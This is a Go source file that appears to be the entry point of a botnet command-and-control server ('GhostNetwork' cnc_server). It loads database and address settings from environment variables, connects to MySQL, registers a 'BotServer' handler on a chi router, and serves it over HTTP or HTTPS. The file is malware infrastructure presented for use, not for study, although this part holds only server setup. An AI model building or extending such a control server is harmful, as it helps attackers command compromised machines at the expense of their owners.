package main

import (
	"fmt"
	"log"
	"net/http"

	"github.com/go-chi/chi"

	"github.com/bienkma/GhostNetwork/cnc_server/configuration"
	"github.com/bienkma/GhostNetwork/cnc_server/handler"
	MyRouter "github.com/bienkma/GhostNetwork/cnc_server/router"
	"github.com/jinzhu/gorm"
)

func main() {
	// Config variable for program
	usage := `Usage:
		# export CNC_ADDRESS = ""
		# export DB_ADDRESS = ""
		# export DB_NAME = ""
		# export DB_PORT = ""
		# export DB_USER = ""
		# export DB_PASS=""
		# export DB_LOG_MODE=""
		# export DB_MAX_CONN=""
		# export CNC_PATH_STORE=""
		# ./cnc_server`

	CNCConf, err := configuration.CNCConfig()
	if err != nil {
		fmt.Println(usage)
	}

	db, err := gorm.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s:%d)/%s?charset=utf8&parseTime=True&loc=UTC",
		CNCConf.DBUser, CNCConf.DBPass, CNCConf.DBAddress, CNCConf.DBPort, CNCConf.DBName) )
	defer db.Close()
	if err != nil{
		panic(err)
	}

	r := chi.NewRouter()
	botServer := handler.BotServer{db, CNCConf}
	MyRouter.Register(r, &botServer)

	log.Printf("Start cnc server!...")
	if CNCConf.USEHTTPs == false{
		fmt.Printf("Server listenning on http://%v", CNCConf.CNCAddress)
		err := http.ListenAndServe(fmt.Sprintf("%v:80", CNCConf.CNCAddress), r)
		if err != nil{
			panic(err)
		}
	}

	fmt.Printf("Server listenning on https://%v:8443", CNCConf.CNCAddress)
	err = http.ListenAndServeTLS(CNCConf.CNCAddress+":8443",CNCConf.SSLCert, CNCConf.SSLKey, r)
	if err!=nil{
		panic(err)
	}
}
